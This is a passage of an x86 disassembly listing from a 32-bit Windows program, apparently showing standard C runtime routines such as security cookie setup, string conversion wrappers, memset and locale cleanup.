  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
